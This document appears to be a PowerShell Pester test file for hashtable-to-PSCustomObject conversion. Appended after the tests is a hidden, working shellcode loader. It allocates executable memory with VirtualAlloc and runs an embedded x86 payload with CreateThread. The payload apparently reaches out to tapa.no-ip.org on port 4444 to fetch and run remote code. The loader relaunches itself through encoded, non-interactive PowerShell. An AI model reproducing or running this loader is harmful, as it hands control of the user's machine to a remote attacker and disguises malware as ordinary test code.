

Describe "Tests for hashtable to PSCustomObject conversion" -Tags "CI" {
    BeforeAll {
        class SampleClass5 {
            [int]$a
            [int]$b
            SampleClass5([int]$x) { $this.a = $x }
            SampleClass5([hashtable]$h) { $this.a = 100; $this.b = 100 }
        }
    }

   $testdata = @(
        @{ Name = 'New-Object cmdlet should accept empty hashtable or $null as Property argument';
           Cmd = "new-object psobject -property `$null";
           ExpectedType = 'System.Management.automation.psobject'
        },
        @{ Name = 'Hashtable conversion to PSCustomObject succeeds (Insertion Order is not retained)';
           Cmd = "[pscustomobject][hashtable]`@{one=1;two=2}";
           ExpectedType = 'System.Management.automation.psobject'
        },
        @{ Name = 'Hashtable(Stored in a variable) conversion to PSCustomObject succeeds (Insertion Order is not retained)';
           Cmd = "`$ht = @{one=1;two=2};[pscustomobject]`$ht";
           ExpectedType = 'System.Management.automation.psobject'
        },
        @{ Name = 'New-Object cmdlet should accept `$null as Property argument for pscustomobject';
           Cmd = "new-object pscustomobject -property `$null";
           ExpectedType = 'System.Management.automation.psobject'
        },
	   @{ Name = 'New-Object cmdlet should accept empty hashtable as property argument for pscustomobject';
           Cmd = "`$ht = @{};new-object pscustomobject -property `$ht";
           ExpectedType = 'System.Management.automation.psobject'
        }
    )

    It 'Type Validation: <Name>' -TestCases:$testdata {
        param ($Name, $Cmd, $ExpectedType)
        Invoke-expression $Cmd -OutVariable a
        $a = Get-Variable -Name a -ValueOnly
        $a | Should -BeOfType $ExpectedType
    }

    It 'Hashtable conversion to PSCustomObject retains insertion order of hashtable keys when passed a hashliteral' {

        $x = [pscustomobject]@{one=1;two=2}
        $x | Should -BeOfType "System.Management.automation.psobject"

        $p = 0
        
        $x.psobject.Properties | foreach-object  `
                                {
                                    if ($p -eq 0)
                                    {
                                        $p++;
                                        $_.Name | Should -BeExactly 'one'
                                     }
                                }
    }

    It 'Conversion of Ordered hashtable to PSCustomObject should succeed' {

       $x = [pscustomobject][ordered]@{one=1;two=2}
       $x | Should -BeOfType "System.Management.automation.psobject"

       $p = 0
       
       $x.psobject.Properties | foreach-object  `
                                {
                                    if ($p -eq 0)
                                    {
                                        $p++;
                                        $_.Name | Should -BeExactly 'one'
                                     }
                                }
    }

    $testdata1 = @(
            @{ Name = 'Creating an object of an existing type from hashtable should throw error when setting non-existent properties';
               Cmd = "[System.MAnagement.Automation.Host.Coordinates]`@{blah=10;Y=5 }";
               ErrorID = 'ObjectCreationError';
               InnerException = $true
            },
            @{ Name = 'Creating an object of an existing type from hashtable should throw error when setting incompatible values for properties';
               Cmd = "[System.MAnagement.Automation.Host.Coordinates]`@{X='foo';Y=5}";
               ErrorID = 'ObjectCreationError';
               InnerException = $true
            },
            @{ Name = 'Conversion from PSCustomObject to hashtable should fail';
               Cmd = "[hashtable][pscustomobject]`@{one=1;two=2}";
               ErrorID ='InvalidCastConstructorException';
               InnerException = $true
            },
            @{
               Name = 'New-Object cmdlet should throw terminating errors when user specifies a non-existent property or tries to assign incompatible values';
               Cmd = "New-Object -TypeName System.MAnagement.Automation.Host.Coordinates -Property `@{xx=10;y=5}";
               ErrorID ='InvalidOperationException,Microsoft.PowerShell.Commands.NewObjectCommand'
            }
        )

    It '<Name>' -TestCases:$testData1 {
        param ($Name, $Cmd, $ErrorID, $InnerException)
        $e = { Invoke-Expression $Cmd } | Should -Throw -PassThru

        if($InnerException)
        {
            $e.Exception.InnerException.ErrorRecord.FullyQualifiedErrorId | Should -BeExactly $ErrorID
        } else {
            $e.FullyQualifiedErrorId | Should -BeExactly $ErrorID
        }
    }

    It  'Creating an object of an existing type from hashtable should succeed' {
        $result = [System.Management.Automation.Host.Coordinates]@{X=10;Y=33}
        $result.X | Should -Be 10
    }

    It 'Creating an object of an existing type from hashtable should call the constructor taking a hashtable if such a constructor exists in the type' {

       $x = [SampleClass5]@{a=10;b=5}
       $x.a | Should -BeExactly '100'
    }

    It 'Add a new type name to PSTypeNames property' {

	    $obj = [PSCustomObject] @{pstypename = 'Mytype'}
	    $obj.PSTypeNames[0] | Should -BeExactly 'Mytype'
    }

    It 'Add an existing type name to PSTypeNames property' {

	    $obj = [PSCustomObject] @{pstypename = 'System.Object'}
	    $obj.PSTypeNames.Count | Should -Be 3
	    $obj.PSTypeNames[0] | Should -BeExactly 'System.Object'
    }
    It "new-object should fail to create object for System.Management.Automation.PSCustomObject" {
        $obj = $null
        $ht = @{one=1;two=2}

        { $obj = New-Object System.Management.Automation.PSCustomObject -property $ht } |
            Should -Throw -ErrorId "CannotFindAppropriateCtor,Microsoft.PowerShell.Commands.NewObjectCommand"
        $obj | Should -BeNullOrEmpty
    }
}


$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x6e,0x65,0x74,0x00,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53,0x53,0x53,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0x53,0x53,0x6a,0x03,0x53,0x53,0x68,0x5c,0x11,0x00,0x00,0xe8,0x9b,0x00,0x00,0x00,0x2f,0x36,0x70,0x4d,0x77,0x32,0x49,0x72,0x59,0x62,0x45,0x45,0x35,0x70,0x54,0x69,0x6b,0x62,0x30,0x76,0x54,0x6d,0x51,0x2d,0x30,0x49,0x33,0x73,0x67,0x57,0x69,0x4d,0x4b,0x36,0x6b,0x38,0x4a,0x58,0x34,0x51,0x33,0x39,0x62,0x00,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc6,0x53,0x68,0x00,0x02,0x60,0x84,0x53,0x53,0x53,0x57,0x53,0x56,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x96,0x6a,0x0a,0x5f,0x53,0x53,0x53,0x53,0x56,0x68,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x08,0x4f,0x75,0xed,0xe8,0x4b,0x00,0x00,0x00,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x68,0x00,0x00,0x40,0x00,0x53,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,0x68,0x00,0x20,0x00,0x00,0x53,0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcf,0x8b,0x07,0x01,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0x5f,0xe8,0x8b,0xff,0xff,0xff,0x74,0x61,0x70,0x61,0x2e,0x6e,0x6f,0x2d,0x69,0x70,0x2e,0x6f,0x72,0x67,0x00,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";$cmd = "-nop -noni -enc ";iex "& $x86 $cmd $e"}else{$cmd = "-nop -noni -enc";iex "& powershell $cmd $e";}

